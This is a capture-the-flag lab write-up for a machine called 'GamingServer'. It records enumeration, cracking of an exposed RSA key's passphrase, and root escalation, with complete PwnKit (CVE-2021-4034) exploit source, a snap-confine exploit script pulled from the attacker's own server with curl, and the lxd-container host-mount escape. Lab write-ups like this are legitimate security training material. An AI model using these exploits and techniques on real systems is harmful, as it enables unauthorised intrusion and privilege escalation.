@@ -1,0 +1,428 @@
+GAMINGSERVER.
+
+
+
+
+[>>> ENUMERATION: PORTS/SERVICES]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.67.69
+[OUTPUT]
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+[>>> RECON: http://10.10.67.69/]
+[ACTION: explore http://10.10.67.69/]
+We land on the template for a site promoting a videogame.
+Reading source code found a username.
+[OUTPUT]
+<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
+
+[NOTE]
+Also, I found http://10.10.67.69/uploads/
+[ACTION: explore http://10.10.67.69/uploads/]
+[OUTPUT]
+Index of /uploads
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	-	 
+[   ]	dict.lst	2020-02-05 14:10	2.0K	 
+[TXT]	manifesto.txt	2020-02-05 13:05	3.0K	 
+[IMG]	meme.jpg	2020-02-05 13:32	15K	 
+[NOTE]
+1. dict.lst: password list.
+2. manifesto.txt: weird manifesto by "the mentor".
+3. meme.jpg: a meme.
+I probably need to find a login directory so we can bruteforce john login.
+
+
+
+
+[>>> ENUMERATION: DIRECTORIES]
+[ACTION: gobuster scan for common directories]
+gobuster dir -u http://10.10.67.69/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[OUTPUT]
+/.htaccess            (Status: 403) [Size: 276]
+/.hta                 (Status: 403) [Size: 276]
+/.htpasswd            (Status: 403) [Size: 276]
+/index.html           (Status: 200) [Size: 2762]
+/robots.txt           (Status: 200) [Size: 33]
+/secret               (Status: 301) [Size: 311] [--> http://10.10.67.69/secret/]
+/server-status        (Status: 403) [Size: 276]
+/uploads              (Status: 301) [Size: 312] [--> http://10.10.67.69/uploads/]
+
+
+[ACTION: explore http://10.10.67.69/robots.txt]
+[OUTPUT]
+user-agent: *
+Allow: /
+/uploads/
+
+
+[ACTION: explore http://10.10.67.69/secret/]
+[OUTPUT] 
+Index of /secret
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	-	 
+[   ]	secretKey	2020-02-05 13:41	1.7K	 
+Apache/2.4.29 (Ubuntu) Server at 10.10.67.69 Port 80
+
+[ACTION: explore http://10.10.67.69/secret/secretKey]
+[OUTPUT]
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
+
+T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
+H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
+FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
+Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
+9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
+IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
+SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
+/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
+w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
+6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
+Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
+xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
+8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
+b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
+vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
+wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
+rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
+RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
+oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
+cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
+99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
+Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
+Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
+v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
+gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
+-----END RSA PRIVATE KEY-----
+[NOTE]
+I would bet we don't even need to bruteforce john's ssh login, since this is likely his key.
+
+
+
+
+[>>> PRIVESC: TO USER]
+[NOTE]
+Nanoed into secret_key and pasted the rsa key we found.
+[ACTION: ssh as john]
+chmod 600 secret_key
+ssh -i secret_key john@10.10.67.69
+[OUTPUT]
+Enter passphrase for key 'secret_key': 
+[NOTE]
+Looks like we need to crack it.
+
+
+[ACTION: convert rsa key to hash]
+ssh2john secret_key > secret_hash.txt
+
+
+[ACTION: crack hash]
+john --wordlist=~/thm/rockyou.txt secret_hash.txt
+[OUTPUT]
+letmein          (secret_key)     
+
+
+[ACTION: ssh as john (2)]
+ssh -i secret_key john@10.10.67.69
+[OUTPUT]
+john@exploitable:~$ 
+
+
+[ACTION: display user flag]
+cat user.txt
+[OUTPUT]
+a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
+
+
+
+
+[>>> PRIVESC: TO ROOT]
+[ACTION: display suid binaries]
+find / -type f -perm /4000 2>/dev/null
+[OUTPUT]
+/bin/mount
+/bin/umount
+/bin/su
+/bin/fusermount
+/bin/ping
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/7270/bin/mount
+/snap/core/7270/bin/ping
+/snap/core/7270/bin/ping6
+/snap/core/7270/bin/su
+/snap/core/7270/bin/umount
+/snap/core/7270/usr/bin/chfn
+/snap/core/7270/usr/bin/chsh
+/snap/core/7270/usr/bin/gpasswd
+/snap/core/7270/usr/bin/newgrp
+/snap/core/7270/usr/bin/passwd
+/snap/core/7270/usr/bin/sudo
+/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/7270/usr/lib/openssh/ssh-keysign
+/snap/core/7270/usr/lib/snapd/snap-confine
+/snap/core/7270/usr/sbin/pppd
+
+
+[ACTION: display pkexec version]
+pkexec --version
+[OUTPUT]
+pkexec version 0.105
+[NOTE]
+Nice, this version can be exploited via https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures.
+
+
+[ACTION: create evil-so.c]
+cat << 'EOF' > evil-so.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void gconv() {}
+
+void gconv_init() {
+    setuid(0);
+    setgid(0);
+    setgroups(0);
+    execve("/bin/sh", NULL, NULL);
+}
+EOF
+
+
+[ACTION: create exploit.c]
+cat << 'EOF' > exploit.c
+#include <stdio.h>
+#include <stdlib.h>
+
+#define BIN "/usr/bin/pkexec"
+#define DIR "evildir"
+#define EVILSO "evil"
+
+int main()
+{
+    char *envp[] = {
+        DIR,
+        "PATH=GCONV_PATH=.",
+        "SHELL=ryaagard",
+        "CHARSET=ryaagard",
+        NULL
+    };
+    char *argv[] = { NULL };
+
+    system("mkdir GCONV_PATH=.");
+    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
+    system("mkdir " DIR);
+    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
+    system("cp " EVILSO ".so " DIR);
+
+    execve(BIN, argv, envp);
+
+    return 0;
+}
+EOF
+
+
+[ACTION: compile and run to privesc]
+gcc exploit.c -o exploit
+[OUTPUT]
+Command 'gcc' not found, but can be installed with:
+sudo apt install gcc
+[NOTE]
+I just checked for the right pkexec version and forgot to verify if the machine even had gcc...
+The exploit also gives error implicit function declaration when trying to compile locally.
+
+
+[ACTION: display snap version]
+snap version
+[OUTPUT]
+snap    2.42.5
+snapd   2.42.5
+series  16
+ubuntu  18.04
+kernel  4.15.0-76-generic
+[NOTE]
+We can try exploit https://github.com/deeexcee-io/CVE-2021-44731-snap-confine-SUID.
+Saved script as snap_confine_LPE.sh
+
+
+[ACTION: start python server]
+python3 -m http.server 8000
+
+
+[ACTION: download script to machine]
+curl -O http://10.23.25.109:8000/snap_confine_LPE.sh
+
+
+[ACTION: run script]
+bash_snap_confine_LPE.sh
+[OUTPUT]
+Vulnerable version found: 2.42.1 at /usr/lib/snapd/snap-confine
+Vulnerable version found: 2.42.5 at /snap/core/8268/usr/lib/snapd/snap-confine
+Vulnerable version found: 2.39.3 at /snap/core/7270/usr/lib/snapd/snap-confine
+Performing actions with a vulnerable version...
+Chosen vulnerable version: 2.42.1
+ln: failed to create hard link './snap-confine' => '/usr/lib/snapd/snap-confine': Operation not permitted
+snap_confine_LPE.sh: line 60: gcc: command not found
+aa-exec: ERROR: Failed to execute "./snap-confine": No such file or directory
+[NOTE]
+gcc missing again...
+
+
+[ACTION: look for cronjobs ran every minute]
+grep -r '* * * * *' /etc/cron.d/
+[OUTPUT]
+/etc/cron.d/php:09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
+/etc/cron.d/mdadm:57 0 * * 0 root if [ -x /usr/share/mdadm/checkarray ] && [ $(date +\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron --all --idle --quiet; fi
+/etc/cron.d/popularity-contest:33 19 * * *   root    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond
+
+
+[ACTION: display john's groups]
+id
+[OUTPUT]
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+[NOTE]
+We are in the lxd group, which means we should have access to the lxd socket, a privesc path.
+
+
+[ACTION: launch a container]
+lxc launch ubuntu:20.04 myexploit
+[OUTPUT]
+Error: Failed container creation: Get https://cloud-images.ubuntu.com/releases/streams/v1/index.json: Unable to connect to: cloud-images.ubuntu.com:443
+[NOTE]
+Machine can't reach the internet.
+
+
+[ACTION: display local images]
+lxc image list
+[OUTPUT]
++-------+-------------+--------+-------------+------+------+-------------+
+| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
++-------+-------------+--------+-------------+------+------+-------------+
+[NOTE]
+None for us to use.
+
+
+[ACTION: download our own image]
+Get ubuntu-20.04-server-cloudimg-amd64-lxd.tar.xz from https://cloud-images.ubuntu.com/releases/focal/release/.
+
+
+[ACTION: start server]
+python3 -m http.server 8000
+
+
+[ACTION: download to machine]
+curl -o ubuntu-20.04-server-cloudimg-amd64-lxd.tar.xz http://10.23.25.109:8000/ubuntu-20.04-server-cloudimg-amd64-lxd.tar.xz
+
+
+[ACTION: import image]
+lxc image import ubuntu-20.04-server-cloudimg-amd64-lxd.tar.xz --alias ubuntu-20.04
+
+
+[ACTION: verify succesful import]
+lxc image list
+[OUTPUT]
++--------------+--------------+--------+------------------------------------+--------+--------+-----------------------------+
+|    ALIAS     | FINGERPRINT  | PUBLIC |            DESCRIPTION             |  ARCH  |  SIZE  |         UPLOAD DATE         |
++--------------+--------------+--------+------------------------------------+--------+--------+-----------------------------+
+| ubuntu-20.04 | cc5906177edf | no     | Ubuntu 20.04 LTS server (20250624) | x86_64 | 0.00MB | Aug 2, 2025 at 7:59pm (UTC) |
++--------------+--------------+--------+------------------------------------+--------+--------+-----------------------------+
+
+
+[ACTION: launch container with imported image]
+lxc launch ubuntu-20.04 myexploit
+[OUTPUT]
+Error: Image is missing a rootfs: /var/lib/lxd/images/cc5906177edf0e24ba82bd90bf6104d0d5c1c4654c2043d68db23b0fbad3c243
+
+
+[ACTION: download image from http://github.com/saghul/lxd-alpine-builder/blob/master/alpine-v3.13-x86_64-20210218_0139.tar.gz]
+
+
+[ACTION: start server]
+python3 -m http.server 8000
+
+
+[ACTION: download to machine]
+curl -o alpine-v3.13-x86_64-20210218_0139.tar.gz http://10.23.25.109:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+
+
+[ACTION: import image]
+lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
+
+
+[ACTION: launch an image named exploit]
+lxc launch alpine exploit
+
+
+[ACTION: mount filesystem]
+lxc config device add exploit host-root disk source=/ path=/mnt/root recursive=true
+	
+
+[ACTION: access container]
+lxc exec exploit /bin/sh
+
+
+[ACTION: go to mounted root]
+cd /mnt/root
+
+
+[ACTION: display root flag]
+cd root
+[OUTPUT]
+/bin/sh: cd: can't cd to root: Permission denied
+
+
+[ACTION: delete current exploit container]
+exit
+lxc delete exploit --force
+
+
+[ACTION: launch again forcing privileges]
+lxc launch alpine exploit -c security.privileged=true
+
+
+[ACTION: mount again]
+lxc config device add exploit host-root disk source=/ path=/mnt/root recursive=true
+
+
+[ACTION: get container shell and display flag]
+lxc exec exploit /bin/sh
+cat /mnt/root/root/root.txt
+[OUTPUT]
+2e337b8c9f3aff0c2b3e8d4e6a7c88fc
